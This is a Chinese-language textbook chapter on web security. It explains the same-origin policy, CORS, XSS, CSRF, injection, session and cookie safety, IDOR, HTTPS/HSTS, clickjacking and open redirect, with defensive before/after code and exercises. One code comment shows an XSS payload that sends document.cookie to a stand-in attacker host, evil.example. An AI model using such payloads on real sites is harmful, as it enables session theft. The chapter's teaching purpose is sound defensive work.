Web 安全

每天,你的瀏覽器都在做一件瘋狂的事:下載一群素未謀面的陌生人寫的程式碼,然後二話不說就在你的電腦上執行它。Web 之所以強大,正是因為它建立在「信任」之上;而 Web 之所以危險,也正是因為這份信任。這一章,我們學著如何在這片最大的攻擊面上,把信任放對地方。

瀏覽器:一台甘願執行陌生程式碼的機器

停下來想三秒:你現在讀這頁的瀏覽器,過去一小時內可能載入了來自幾十個不同網域、 成千上萬行你完全沒讀過、也無法事先審查的 JavaScript。廣告商的、分析工具的、 留言區別人貼的……瀏覽器把它們通通下載下來,然後在你的機器上、用你的登入身分,執行了它們。

這在任何其他情境都是天方夜譚。沒有人會把一個來路不明的 .exe 雙擊執行 (我們在第 34 章就警告過);但在 Web 上,這件事每秒鐘發生上億次,而且我們覺得理所當然。 Web 的整個價值——「打開連結就能用,不必安裝」——正是建立在「瀏覽器敢執行陌生程式碼」這個大膽假設之上。 於是 Web 同時成了人類有史以來最大的攻擊面(attack surface)。

🔑
Web 安全的核心,是一個信任問題

瀏覽器的處境很弔詭:它必須執行來自陌生伺服器的程式碼,卻又必須保護使用者的資料、 身分與其他網站。整部 Web 安全史,可以看成在回答同一個問題:「哪些程式碼,該被允許碰哪些資料?」 把界線畫對了,Web 既開放又安全;畫錯一條,別人寫的腳本就能讀你的銀行 cookie。 本章談的每一種攻擊與防禦,骨子裡都是這條信任界線的攻防。

先快速回顧:HTTP 與瀏覽器模型

Web 安全幾乎全部站在第 25 章的網路知識上,我們先把那幾塊地基喚醒。第一,Web 用的是 HTTP 的請求-回應模型:瀏覽器(客戶端)發出請求,伺服器回傳回應。第二,HTTP 是 無狀態(stateless)的——伺服器處理完一個請求就把你忘光,所以要靠 cookie 這張「小紙條」人工縫補出「登入狀態」的記憶。第三,瀏覽器拿到回應後,會把 HTML 解析成 DOM(文件物件模型),並執行裡面的 JavaScript、套用 CSS、載入圖片與其他資源。

這三件事,每一件都埋著一顆安全的種子:HTTP 傳的若是明文,沿途有人能竊聽(第 25 章談過, 所以要 HTTPS);cookie 既然代表「你的身分」,被偷走就等於被冒充;而瀏覽器「會執行頁面裡的 JavaScript」這件事, 正是 XSS 的全部前提。記住這張圖,我們開始把信任的界線一條條畫出來。

⚖️
先講清楚:立場與界線

這一章會展示「漏洞長什麼樣、攻擊如何發生」,但所有程式碼都是防禦與教學用途—— 我們刻意只講到「概念與成因」,不提供可以直接複製去攻擊別人網站的完整 exploit。 這些知識的唯一正當用途,是把你自己(與你受僱保護)的系統寫得更安全, 以及在明確獲得授權的前提下做安全測試。未經授權去探測、攻擊任何不屬於你的網站, 即使「只是看看」,在絕大多數國家都是犯罪。這條倫理與法律的界線,我們在第 36 章強調過, 也會在第 41 章「計算倫理」正式深入。理解攻擊,是為了更好地防守。

Web 安全的基石:同源政策

如果瀏覽器真的「來者不拒」地讓任何頁面的腳本碰任何資料,Web 一天都活不下去:你開著網路銀行的分頁, 另一個分頁裡某個惡意網站的 JavaScript,就能直接讀走你銀行頁面的內容、偷走你的 cookie、替你按下「轉帳」。 是什麼東西在阻止這場災難?答案是 Web 安全最重要、卻最少被提起的基石:同源政策(same-origin policy,SOP)。

同源政策的規則一句話就能說完:一個來源(origin)的程式碼,預設只能存取「同一個來源」的資料, 不能去讀其他來源的東西。那麼,什麼叫「同一個來源」?所謂來源,是由三樣東西組成的: 協定(scheme)+ 主機(host)+ 連接埠(port)。三者完全相同,才算同源; 只要差一個,瀏覽器就視為不同來源,互相隔離。

同源政策是一道沉默的英雄:它在背景默默運作,你幾乎感覺不到它,但正是它讓你能同時開著網銀和不信任的網站, 而後者偷不到前者的資料。它管的主要是「讀取」:evil.com 的腳本可以發出一個請求到 bank.com(這點很重要,等一下談 CSRF 時會回來),但它讀不到那個回應的內容,也讀不到 bank.com 分頁的 DOM 與 cookie。隔離的是「跨來源讀資料」這件事。

CORS:受控地把牆打開一道門

同源政策很安全,但有時候太安全了。現代網站常把前端(https://app.example.com) 和後端 API(https://api.example.com)放在不同來源;前端的 JavaScript 需要去呼叫後端 API、 而且要能讀到回應。可是它們不同源,SOP 預設會擋掉。怎麼辦?

答案是 CORS(Cross-Origin Resource Sharing,跨來源資源共享)。它不是「繞過」同源政策, 而是一套由伺服器主動授權的機制:被請求的那台伺服器,可以在回應裡加上一個標頭,明白宣告 「我允許來自某某來源的頁面讀取我的回應」。瀏覽器看到這個許可,才放行;沒有,就維持隔離。 

回應標頭(由 api.example.com 發出,授權 app.example.com 讀取它):
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true

關鍵觀念是:放行的決定權在「被存取的伺服器」手上,而不是在發起請求的頁面。 這個方向很重要——它意味著惡意網站無法自己宣告「我可以讀 bank.com」,因為那個許可只有 bank.com 自己能發。

⚠️
CORS 最常見的致命設定錯誤

很多人被 CORS 擋到、又懶得查文件,就直接設成 Access-Control-Allow-Origin: * (允許「任何來源」讀取)。對公開、無須登入的資料,這沒問題;但若這個 API 會回傳 使用者的私密資料、又同時允許帶 cookie,等於親手拆掉同源政策這道牆——任何網站都能讀你的私密回應。 更糟的是「把請求的 Origin 原封不動反射回去」當作 Allow-Origin,效果等同 * 卻還能帶憑證。 原則:只白名單列出你真正信任的來源,絕不對「需要憑證的私密 API」開放萬用字元。 CORS 是「故意開的一扇門」,不是「拆掉整道牆」。

跨站腳本攻擊(XSS):把腳本注入別人的瀏覽器

我們在第 36 章把 XSS 歸進「注入家族」,並預告完整版留到本章。現在兌現。 跨站腳本(Cross-Site Scripting,XSS)的核心,是攻擊者想辦法讓他寫的 JavaScript, 在受害者的瀏覽器裡、以受害者所在網站的身分執行。一旦得逞,那段腳本就站在了 同源政策的「牆內」——它能讀該網站的 DOM、偷該網站的 cookie、冒充使用者發請求,幾乎無所不能。

為什麼會發生?還是那句老話:資料被當成了程式碼。當網站把使用者提供的內容, 「原封不動」地嵌進 HTML 頁面裡,而那段內容裡藏著 <script>,瀏覽器分不出 「這是該顯示的文字」還是「這是該執行的腳本」,就照單全收地執行了。依「惡意腳本怎麼送達受害者」的不同, XSS 分成三種型態。

三種 XSS:反射型、儲存型、DOM 型

  • 反射型(reflected):惡意腳本藏在網址或請求參數裡,被伺服器「反射」進當下的回應頁面。 攻擊者得先誘騙受害者點一個特製連結(例如釣魚信裡的網址)。腳本不會被保存,只在那一次回應裡出現。
  • 儲存型(stored):最危險的一種。惡意腳本被存進伺服器(留言、暱稱、商品評論……), 之後每一個瀏覽到該頁面的使用者都會中招——不需誘騙、自動散播,像一顆埋在資料庫裡的地雷。
  • DOM 型(DOM-based):漏洞完全發生在前端 JavaScript:腳本把不可信的資料 (如 location.hash)直接寫進頁面,壓根沒經過伺服器。是純客戶端的注入。

來看儲存型 XSS 的完整劇本——它最能說明「為什麼一個沒編碼的輸出能造成連鎖災難」:

看一段會出事的後端程式碼(Flask 偽碼),以及它為什麼危險: 

# ⛔ 危險:把使用者留言「原封不動」拼進 HTML
@app.route("/comment")
def show_comment():
    text = get_latest_comment()          # 例如使用者存的內容含 <script>
    return "<div class='comment'>" + text + "</div>"
    # 若 text = "<script>fetch('//evil.example/?c='+document.cookie)</script>"
    # 這段腳本就會在每個讀者的瀏覽器裡執行,把他們的 cookie 外傳給攻擊者

問題的根源,跟 SQL 注入一模一樣:程式把「資料」直接拼進了一個會被「直譯器」(這裡是瀏覽器的 HTML 解析器) 解讀的字串。解法也同出一轍——讓資料永遠以「純文字」的身分進入 HTML,而不是以「標籤」。

第一道防線:輸出編碼 / 脫逸

輸出編碼(output encoding / escaping)是 XSS 最根本的解法:在把資料寫進 HTML 之前, 先把那些有「語法意義」的字元,轉成對應的 HTML 實體(entity)。最關鍵的五個字元是:

原字元編碼成為什麼危險
<&lt;開啟標籤(如 <script>)
>&gt;關閉標籤
&&amp;實體的起頭
"&quot;跳出 HTML 屬性的雙引號
'&#x27;跳出 HTML 屬性的單引號

經過編碼後,瀏覽器會把 &lt;script&gt; 顯示成文字「<script>」, 而不是「執行一段腳本」。資料被當回了資料。來看 before / after(防禦角度): 

from markupsafe import escape

# ❌ before:直接拼接,使用者輸入會被當 HTML 解析
def render(text):
    return "<div class='comment'>" + text + "</div>"

# ✅ after:對資料做 HTML 輸出編碼,< > & " ' 全被轉成實體
def render(text):
    return "<div class='comment'>" + str(escape(text)) + "</div>"
    # escape("<script>x</script>") → "&lt;script&gt;x&lt;/script&gt;"
    # 瀏覽器把它當文字顯示,不會執行
💡
好消息:現代框架預設就幫你編碼

你大概不必手動呼叫 escape。Jinja2、React、Vue、Angular 這些現代模板/框架, 在你用「正規方式」輸出變數時(Jinja 的 {{ text }}、React 的 {text}), 預設就會自動做 HTML 編碼。XSS 的洞,往往出在你「繞過」了這個保護: 用了 render_template_string 拼字串、用了 React 的 dangerouslySetInnerHTML、 或在前端直接寫 element.innerHTML = userInput。看到名字裡有 danger、或在「手動拼 HTML」時, 就該警鈴大作。順著框架走,而不是繞過它,你已經擋掉九成的 XSS。

補一句 DOM 型 XSS 的防禦:當你在前端 JavaScript 裡要把資料放進頁面時,用 element.textContent = data(把資料當純文字放), 而不是 element.innerHTML = data(把資料當 HTML 解析)。 這個一字之差,就是「安全」與「注入」之差。

第二道防線:內容安全政策(CSP)

輸出編碼是治本,但人會漏。萬一真的漏了一個沒編碼的輸出,還有沒有第二層網?有—— 內容安全政策(Content Security Policy,CSP)。它是一個由伺服器發出的 HTTP 標頭, 告訴瀏覽器:「這個頁面,只准執行/載入來自這些來源的資源。」 

回應標頭:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

上面這條政策的意思是:腳本(script-src)只能從本站自己('self')載入。 於是,就算攻擊者成功把 <script>...</script> 注入進頁面,瀏覽器也會拒絕執行 那段「行內(inline)」腳本——因為政策沒允許 inline。CSP 把「萬一漏了一個 XSS」的後果, 從「腳本照跑」降級成「腳本被瀏覽器擋下」。這正是縱深防禦的精神:不把所有希望押在單一道防線。

ℹ️
CSP 是「減災」,不是「免死金牌」

CSP 很強,但別把它當成不做輸出編碼的藉口。它有眉角:設定不當(例如為了相容而加了 'unsafe-inline')會讓保護形同虛設;舊瀏覽器支援度也不一。把它當作第二層保險—— 第一層永遠是「正確的輸出編碼」。兩層一起上,才穩。

第三道防線:HttpOnly cookie

XSS 最常見的目的之一,是偷 cookie(尤其是 session cookie)拿去冒充你。那能不能讓「JavaScript 根本讀不到 cookie」? 可以——在 cookie 上加 HttpOnly 屬性: 

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax

加了 HttpOnly 之後,這個 cookie 只會被瀏覽器在發 HTTP 請求時自動附上, 但 document.cookie 讀不到它。如此一來,即使頁面被 XSS 攻陷, 那段惡意腳本也偷不走 session cookie。這不能阻止 XSS 發生,但能大幅降低它的危害—— 又是一層縱深防禦。(同一行裡的 Secure 與 SameSite 等屬性,我們在後面工作階段那節細談。)

✏️ 練習 52.1 實作

下面這個 Flask 端點有反射型 XSS 漏洞:它把網址參數 q 直接拼進回應頁面,顯示「您搜尋了:...」。 請(a)說明攻擊者大致會構造什麼樣的連結來觸發 XSS、會造成什麼後果;(b)把它改寫成安全版本(輸出編碼)。 (c)再補一句:除了編碼,你還會加哪一個 HTTP 標頭當第二層防線?

@app.route("/search")
def search():
    q = request.args.get("q", "")
    return "<h1>您搜尋了:" + q + "</h1>"
看解答

(a) 攻擊與後果:因為 q 被原封不動拼進 HTML,攻擊者可構造一個連結, 讓 q 的值帶有 <script>...</script> 之類的內容(例如把竊取 cookie 的腳本塞進去), 再透過釣魚信、social media 等管道誘騙受害者點擊。受害者一點開,腳本就在他的瀏覽器裡、 以這個網站的身分執行:可以偷 cookie、冒充身分、竄改畫面。這是典型的反射型 XSS—— 惡意內容來自網址、被伺服器反射進回應。

(b) 修正(輸出編碼):把 q 編碼後再放進 HTML。最好直接用模板讓它自動編碼:

from markupsafe import escape

@app.route("/search")
def search():
    q = request.args.get("q", "")
    return "<h1>您搜尋了:" + str(escape(q)) + "</h1>"
    # 更好的做法:用 render_template + {{ q }},讓 Jinja2 自動編碼

編碼後,< > 等字元變成 HTML 實體,瀏覽器會把使用者輸入「顯示成文字」而非「執行成腳本」。

(c) 第二層防線:加上 CSP 標頭(如 Content-Security-Policy: default-src 'self'),這樣即使哪天又漏了一個沒編碼的輸出, 瀏覽器也會拒絕執行注入的 inline 腳本。再搭配 session cookie 的 HttpOnly, 讓腳本就算跑起來也偷不到 session。三層疊加,就是縱深防禦。

跨站請求偽造(CSRF):盜用你「已登入」的身分

XSS 偷的是「你的資料」;接下來這種攻擊更陰險,它偷的是「你的身分與意圖」。 跨站請求偽造(Cross-Site Request Forgery,CSRF)利用的是一個你習以為常、卻暗藏風險的瀏覽器行為: 瀏覽器發請求到某個網站時,會「自動」帶上該網站的 cookie——不管這個請求是從哪個頁面發起的。

把這個行為和「cookie 代表你的登入身分」放在一起,問題就浮現了:假設你剛在 bank.example.com 登入(瀏覽器存了你的 session cookie),然後你在同一個瀏覽器 裡開了另一個分頁,逛到一個惡意網站 evil.example。那個惡意頁面裡藏了一段程式, 悄悄對 bank.example.com/transfer 發出一個轉帳請求。瀏覽器一看是發給 bank.example.com 的, 就很「貼心」地把你的 session cookie 自動附上去——於是銀行收到一個「帶著你有效登入憑證」的轉帳請求, 以為是你本人操作,照辦了。

體會一下這裡的精妙之處:攻擊者從頭到尾沒有偷到你的 cookie,也因為同源政策而讀不到銀行的回應。 他做的只是「借用你那個已登入的瀏覽器,替你發出一個你沒打算發的請求」。 所以 CSRF 攻擊的目標,通常是會改變狀態的操作:轉帳、改 email、改密碼、刪資料—— 因為攻擊者讀不到結果,純粹的「讀取」對他沒意義。

防禦一:CSRF token

CSRF 之所以成立,是因為伺服器分不出「這個帶著有效 cookie 的請求,到底是使用者本人在我的頁面上操作的, 還是被某個惡意網站偽造的」。CSRF token 的點子,就是給合法請求一個「惡意網站拿不到的暗號」。

做法:伺服器在產生表單頁面時,塞進一個隨機、不可預測、跟使用者 session 綁定的 token (用 CSPRNG 產生,呼應第 36 章),通常放在一個隱藏欄位裡。當使用者真的送出表單,這個 token 會一起被送回來, 伺服器核對相符才執行。關鍵在於:惡意網站受同源政策限制,讀不到你銀行頁面裡的這個 token, 所以它偽造的請求湊不出正確暗號,當場被擋。 

<!-- 伺服器產生表單時,埋入一個與此 session 綁定的隨機 token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="9f3a...隨機且不可預測...">
  <input name="amount">
  <button>轉帳</button>
</form>
# 伺服器端:核對 token,不符就拒絕(失敗時倒向「拒絕」——fail securely)
@app.route("/transfer", methods=["POST"])
def transfer():
    if not constant_time_eq(request.form.get("csrf_token"), session.get("csrf_token")):
        abort(403)            # token 缺失或不符 → 拒絕,絕不執行
    do_transfer(...)

防禦二:SameSite cookie

CSRF token 之外,還有一個更釜底抽薪的近代防線,直接從「cookie 要不要自動附上」這件事下手: SameSite cookie 屬性。它讓你告訴瀏覽器「這個 cookie,在跨站請求時, 要不要自動帶上」。三個值:

  • SameSite=Strict:最嚴。只要請求是從別的站發起的,cookie 一律不帶。 CSRF 直接失效。代價:從外站連結點進來時,會「看起來像沒登入」(因為第一個請求不帶 cookie),體驗略受影響。
  • SameSite=Lax:折衷,也是現代瀏覽器的預設值。跨站的「頂層導覽 GET」 (例如點連結跳過來)會帶 cookie,但跨站的 POST、以及背景發起的請求(圖片、表單自動送出、fetch) 不帶 cookie。這恰好擋住了 CSRF 最常用的「跨站 POST」手法,又不太傷使用體驗。
  • SameSite=None:完全不限制(任何跨站請求都帶 cookie),必須同時加 Secure。 只有在你真的需要跨站帶 cookie(如某些第三方嵌入)時才用,等於放棄這層保護。

為什麼 SameSite=Lax(甚至 Strict)能緩解 CSRF?回頭看圖 52-3:CSRF 的命脈, 是「惡意頁面發起的跨站請求,瀏覽器自動帶上了銀行 cookie」。SameSite=Lax 正好把 「跨站背景 POST 帶 cookie」這條路截斷——惡意頁面替你發的轉帳 POST,根本不會帶上你的 session cookie, 銀行就當你沒登入,攻擊瓦解。

🔑
CSRF 的兩道現代防線,一起用

① CSRF token(惡意站拿不到的暗號)+ ② SameSite cookie (跨站乾脆不帶 cookie),是今天防 CSRF 的標準組合。兩者互補:SameSite 由瀏覽器強制、覆蓋面廣, 但你不能假設所有使用者的瀏覽器都正確支援;CSRF token 是應用層自己把關,不依賴瀏覽器行為。 縱深防禦的老道理——別把命押在單一層。順帶一提:CSRF 防的是「狀態變更操作」,所以把 GET 設計成不改變狀態(GET 只讀、改用 POST/PUT/DELETE 改資料)本身也是一層保護。

✏️ 練習 52.2 思考

你的同事說:「我們網站要求登入才能改密碼,而且改密碼一定要帶著有效的 session cookie, 所以不可能被 CSRF 攻擊吧?」請指出他的誤解,用一兩句話說明 CSRF 為什麼正好利用了 「自動帶 cookie」這件事,並提出兩個具體的防禦設計。

看解答

誤解所在:「需要有效 cookie」恰恰是 CSRF 能成立的原因,而不是它的剋星。 因為瀏覽器在發請求給你的網站時,會自動附上該站的 cookie——無論這個請求是使用者本人發起的, 還是某個惡意網站偷偷發起的。所以「帶著有效 cookie」這件事,惡意網站不費吹灰之力就能滿足: 它只要讓受害者(已登入狀態)的瀏覽器,對你的「改密碼」端點發出一個請求即可。攻擊者全程不需要、 也偷不到 cookie 本身,他只是借用了受害者已登入的瀏覽器。

兩個防禦設計:

  1. CSRF token:改密碼表單裡放一個隨機、與 session 綁定、不可預測的 token, 送出時一併驗證。惡意網站受同源政策限制,讀不到這個 token,偽造的請求就湊不出正確暗號,被擋下。
  2. SameSite=Lax 或 Strict 的 session cookie: 讓瀏覽器在「跨站發起的請求」時不自動帶上 session cookie,惡意網站發的改密碼請求因此「未登入」,失敗。

更進一步:敏感操作(改密碼)應要求重新輸入目前密碼——這是攻擊者完全不知道的東西, 提供了與 CSRF token 互補的一層防護。

注入:在 Web 脈絡裡再看一次

第 36 章已經把注入講透,這裡只在 Web 的脈絡下快速複習,並補上一個 Web 特別關心的角度。 記住那句核心:所有注入,都是「資料」越界變成了「指令/語法」。

SQL 注入

Web 應用最典型的注入,是把使用者輸入(來自表單、網址參數、JSON body)拼進 SQL 查詢。攻擊者用一段精心構造的輸入, 讓 WHERE 條件恆真、或把後面的檢查註解掉,就能繞過登入、撈出整張表、甚至(設定不當時)竄改或刪除資料。 解法是參數化查詢(prepared statement)——把資料和指令徹底分開,讓資料庫永遠把參數當「純資料」: 

# ⛔ 把使用者輸入拼進 SQL(f-string 跟字串相加一樣致命)
def find_user(name):
    return db.execute(f"SELECT * FROM users WHERE name = '{name}'")

# ✅ 參數化:資料走獨立通道,無論裡面有什麼引號都不會變成 SQL 語法
def find_user(name):
    return db.execute("SELECT * FROM users WHERE name = ?", (name,))

命令注入,以及「最小權限」在 Web 的份量

若 Web 後端把使用者輸入拼進一條系統指令交給 shell(例如某個「線上工具」呼叫外部程式), 就是命令注入。解法同樣是「不經 shell、用參數陣列直接執行」,並對輸入做白名單驗證(細節見第 36 章)。 這裡要特別強調 Web 場景下三個彼此呼應的防線:

  • 參數化 / 分離通道:從機制上讓資料不可能被當成指令(SQL、shell、LDAP……皆然)。
  • 輸入驗證(白名單):在信任邊界擋掉不合法的輸入,是第一道、但不是唯一一道防線。
  • 最小權限(least privilege):Web 應用連資料庫的帳號,只給它需要的權限—— 若它只需讀寫幾張表,就別給它 DROP TABLE 或存取其他資料庫的權力。這樣即使注入沒擋住, 攻擊者能造成的破壞也被框在最小範圍。資料庫不該用最高權限帳號連線,Web 程序也不該用 root 跑。
🔗
注入的細節在第 36 章

SQL 注入的逐步成因(單引號如何「跳出」字串、-- 如何註解掉密碼檢查)、命令注入的 shell 元字元、 以及更多 before/after,都在第 36 章有完整圖解與練習。這一章我們把焦點放在 Web 獨有的攻擊面; 注入只是順道把「它在 Web 也很常見」這件事釘牢。

認證與工作階段安全

HTTP 是無狀態的(第 25 章),所以「你是誰、你登入了沒」這件事,全靠 cookie + session 這套機制人工維持。 既然 session 代表你的身分,它就成了攻擊者的頭號目標。這一節把幾個高頻地雷掃過。

cookie 與 session 機制

最常見的做法:使用者登入成功後,伺服器產生一個又長又隨機的 session ID, 一邊存在伺服器端(對應到「這是哪個使用者」),一邊用 Set-Cookie 發給瀏覽器。 之後每個請求,瀏覽器自動帶上這個 cookie,伺服器一查就「想起你是誰」。所以 session ID 等同你的臨時通行證—— 誰拿到它,誰就是你。

兩種偷通行證的手法:劫持與固定

  • 工作階段劫持(session hijacking):攻擊者設法取得你既有的 session ID—— 透過 XSS 偷 cookie、在不安全的 Wi-Fi 上竊聽未加密的連線、或從外洩的日誌裡撿到。拿到就能直接冒充你。
  • 工作階段固定(session fixation):反過來,攻擊者先給你一個他已知的 session ID, 誘使你用它登入;若伺服器登入前後沿用同一個 ID,你登入成功後,攻擊者手上那個 ID 也一起「升級」成已驗證。

防禦原則:

  • 登入成功的那一刻,重新產生 session ID(丟掉舊的、發新的)——直接消滅 session fixation。
  • session ID 用 CSPRNG 產生(夠長、不可預測),別用可猜的流水號。
  • 全程 HTTPS,讓 session cookie 不可能在傳輸途中被竊聽。
  • 設定合理的逾時與登出機制,縮短通行證的有效窗口。

安全的 cookie 屬性:把通行證鎖好

前面零散提過,這裡一次整理。一個存放 session 的 cookie,該長這樣: 

Set-Cookie: session=<CSPRNG 產生的隨機值>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
屬性作用擋掉什麼
HttpOnlyJavaScript 讀不到此 cookie(document.cookie 看不見)XSS 偷 session
Secure只在 HTTPS 連線上傳送明文連線上被竊聽
SameSite=Lax/Strict跨站請求不自動帶上此 cookieCSRF
Path / Domain限制 cookie 的適用範圍過度曝露給不相關路徑/子網域
Max-Age / Expires設定有效期限過期通行證被長期濫用
💡
JWT 一句話

除了「session ID + 伺服器端記憶」這條傳統路線,你也會看到 JWT(JSON Web Token): 一個由伺服器簽章、內含使用者資訊的自帶 token,讓伺服器不必存 session 狀態(無狀態驗證)。 它很方便,但有自己的坑(務必驗證簽章、拒絕 alg=none、別在 payload 放敏感資料、 token 一旦發出難以即時撤銷)——這些細節超出本章,知道它的存在與「要驗簽」這條鐵律即可。

密碼儲存與多因素

認證的根基是密碼,而密碼的儲存有兩條鐵律,我們在第 35 章(密碼學)與 第 34 章(資安基礎)都立過,這裡再釘一次:

  • 絕不明文存密碼,絕不用快速雜湊。用專為密碼設計的慢雜湊 (bcrypt、scrypt、Argon2),它們內建加鹽(salt)讓相同密碼產生不同雜湊、且刻意計算很慢, 讓暴力破解不划算(呼應第 35 章)。一句話:用現成函式庫,別自己發明。
  • 提供並鼓勵多因素認證(MFA)。密碼會被猜中、被釣走、被外洩;MFA 多要一個「不同種類」的因素 (你持有的手機、你本身的生物特徵),即使密碼被竊,攻擊者仍缺一塊(呼應第 34 章)。 MFA 是性價比最高的個人資安措施,沒有之一。

授權:你能不能做這件事?

認證(authentication)回答「你是誰」;授權(authorization)回答「你能做什麼」。 兩者常被混為一談,但它們是兩個獨立的洞——而授權出錯,常年高居 OWASP Top 10 的第一名。 為什麼?因為它太容易被忽略:開發者把心力都花在「登入機制」上,卻忘了在每個敏感操作前,再問一句 「這個已登入的人,有權碰這筆資料嗎?」

IDOR:把 1042 改成 1043

最經典的授權漏洞,叫不安全的直接物件參考(Insecure Direct Object Reference,IDOR)。 想像一個看帳單的端點: 

# ⛔ 只檢查「有沒有登入」,沒檢查「這張帳單是不是你的」
@app.route("/invoice")
def get_invoice():
    invoice_id = request.args.get("id")        # 例如 /invoice?id=1042
    invoice = db.get_invoice(invoice_id)
    return render_invoice(invoice)             # 任何登入者改 id 就能看別人的帳單

使用者 A 登入後,看到自己的帳單網址是 /invoice?id=1042。他把 1042 改成 1043、1044……就翻出了別人的帳單。程式「認證」沒問題(他確實登入了), 但「授權」整個缺席——它從沒檢查「這張帳單的擁有者,是不是當前這個使用者」。修法: 

# ✅ 在伺服器端比對「這筆資源是否屬於當前使用者」
@app.route("/invoice")
def get_invoice():
    invoice_id = request.args.get("id")
    invoice = db.get_invoice(invoice_id)
    if invoice is None or invoice.owner_id != current_user.id:
        abort(404)                              # 不是你的 → 當作不存在
    return render_invoice(invoice)

延伸的還有權限提升(privilege escalation):一般使用者透過某些手法取得管理員權限; 以及功能級存取控制缺失(missing function-level access control):管理功能的端點(如 /admin/deleteUser)沒在伺服器端檢查「呼叫者是不是管理員」,於是任何人直接打那個網址就能用。

⛔
「把按鈕藏起來」不是安全

新手最常見的授權誤解:「我在前端把『刪除使用者』的按鈕對非管理員隱藏了,他們就點不到了。」 錯。前端隱藏的只是畫面,不是能力。任何人都能打開瀏覽器的開發者工具、 看 JavaScript 怎麼發請求,然後直接手動發出那個請求——根本不需要那顆按鈕。 所有授權檢查,都必須在「伺服器端」做,而且要在「每一個」敏感操作上做。 前端的隱藏/禁用,只是使用體驗(不給使用者看他用不到的東西),從來不是安全機制。 這條原則,值得你刺在心上。

✏️ 練習 52.3 思考

對下面三個情境,各判斷它主要屬於哪一種漏洞(IDOR / XSS / CSRF),並用一句話說明理由與修法方向:

  1. 論壇的「個人簡介」欄位允許填任意文字,而頁面把它直接顯示出來。某使用者在簡介裡填入一段 <script>,結果其他人一瀏覽他的個人頁,瀏覽器就執行了那段腳本。
  2. 某 API 是 GET /api/orders/{id},登入後可查訂單。小明發現把 id 從自己的 5001 改成 5002,就看到了別人的訂單明細。
  3. 一個惡意網頁裡藏了一段會自動送出的表單,目標是 POST https://shop.example/account/email (修改帳號信箱)。受害者(在另一分頁已登入 shop)一打開該惡意網頁,信箱就被改成攻擊者的了。
看解答
  1. 儲存型 XSS。使用者輸入(簡介)被存進伺服器、又原封不動嵌進 HTML,腳本在每個瀏覽者的瀏覽器執行。 修法:輸出編碼(顯示時把 < > & " ' 轉成實體),搭配 CSP 與 HttpOnly cookie。
  2. IDOR(授權問題)。認證通過(已登入),但缺少「這筆訂單是否屬於當前使用者」的授權檢查, 靠改 id 就能越權看別人資料。修法:在伺服器端比對 order.owner_id == current_user.id,不符回 404/403。
  3. CSRF。惡意網頁讓受害者已登入的瀏覽器,自動帶著 cookie 發出一個「改信箱」的跨站 POST。 修法:CSRF token + SameSite cookie,敏感操作再要求重新驗證密碼。

判斷訣竅:看「攻擊者注入了會執行的腳本嗎?」(XSS)、「他靠改參數存取了不屬於他的資源嗎?」(IDOR)、 「他借用受害者的登入身分代發了狀態變更請求嗎?」(CSRF)。

傳輸安全:把資料鎖在路上

前面談的都是「應用層」的攻防。但別忘了第 25 章的殘酷真相:一個封包要一跳一跳穿越 幾十台你不認識的機器,而最原始的 HTTP 傳的是明文——沿途任何人都能竊聽、甚至竄改。 守住這條路,靠的是 HTTPS。

HTTPS / TLS:加密 + 驗證身分

HTTPS 就是 HTTP 套上 TLS(Transport Layer Security) 這層加密外殼(第 25、35 章)。 它一次解決兩個問題:機密性(沿途的人只看到亂碼)與真實性 (透過憑證確認「你連到的真的是 bank.com,不是冒牌貨」),順帶還保護完整性 (傳輸途中被竄改會被偵測)。它正是擋下中間人攻擊(MITM)的關鍵——攻擊者卡在你和伺服器之間, 若沒有有效憑證,瀏覽器會跳出警告,他就無法神不知鬼不覺地假冒對方。

憑證(certificate)是怎麼運作的?簡單說:由受信任的憑證授權機構(CA) 對「這個網域屬於這個伺服器」這件事數位簽章背書;瀏覽器內建一份它信任的 CA 名單, 驗證憑證鏈無誤,才相信對方身分。完整的 TLS 握手、公開金鑰、數位簽章與 PKI,在第 35 章有完整故事。

HSTS:強制走 HTTPS,別給降級的機會

光支援 HTTPS 還不夠。如果使用者手動打 http://、或攻擊者把連結偷偷改成 http://, 第一個請求仍可能走明文,給了攻擊者「降級(downgrade)」的可乘之機。 HSTS(HTTP Strict Transport Security)就是堵這個縫:伺服器發一個標頭,告訴瀏覽器 「從今以後,在這個期限內,只准用 HTTPS 連我」。 

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

瀏覽器記住後,即使使用者打 http://,它也會在送出請求之前就自己改成 https://, 連那個可被攻擊的第一次明文請求都省掉。preload 更進一步,把網域登進瀏覽器內建的清單,連「第一次」都保護。

混合內容:一條鏈,最弱的一環說了算

假設你的頁面用 HTTPS 載入,卻在裡面用 http:// 引入了一張圖、一段 script 或一個 CSS—— 這叫混合內容(mixed content)。為什麼危險?因為那個走明文的資源,沿途可被竊聽或竄改; 若被掉包的是一段 JavaScript,攻擊者等於在你「看起來安全」的 HTTPS 頁面裡植入了任意腳本—— 整個頁面的安全保證瞬間歸零。一條安全鏈的強度,由最弱的一環決定。所以現代瀏覽器會直接封鎖 高風險的混合內容。原則:HTTPS 頁面裡的所有資源都要走 HTTPS,一個都不能漏。

其他你該認得的 Web 弱點

點擊劫持(clickjacking)

點擊劫持是一種視覺上的騙術:攻擊者把你的真實網站用透明的 <iframe> 疊在他的惡意頁面上,再把一顆誘人的按鈕(「點我抽 iPhone」)放在你網站某個敏感按鈕(「確認轉帳」「刪除帳號」) 的正下方。使用者以為自己點的是抽獎,實際上「穿透」點到了底下你網站的真實按鈕——而且因為他確實已登入,操作就生效了。

防禦:用標頭告訴瀏覽器「不准把我的頁面嵌進別人的 iframe」: 

X-Frame-Options: DENY
（或用較新的 CSP 寫法:）
Content-Security-Policy: frame-ancestors 'none'

開放重新導向(open redirect)

很多網站有「登入後跳回原頁」的功能,網址像 /login?next=/dashboard。若伺服器不驗證 next 的值就照單跳轉,攻擊者可構造 /login?next=https://evil.example—— 受害者看到網址開頭是你的可信網域,放心點下,卻在登入後被導到釣魚站。這叫開放重新導向, 常被用在釣魚的「最後一哩」。防禦:只允許跳轉到自己站內的相對路徑,或用白名單核對目標網域, 絕不直接信任使用者給的完整網址。

伺服器端請求偽造(SSRF)

